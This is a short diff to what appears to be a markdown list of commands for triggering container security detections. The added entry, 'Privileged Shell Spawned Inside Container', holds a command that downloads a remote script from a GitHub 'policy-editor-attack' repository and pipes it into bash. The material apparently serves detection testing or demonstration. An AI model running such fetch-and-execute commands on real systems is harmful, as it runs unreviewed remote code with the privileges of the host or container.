@@ -283,3 +283,8 @@ ls | grep *.sh
 ```
 cat security-checks.sh
 ```
+
+Privileged Shell Spawned Inside Container
+```
+sh -c curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash
+```
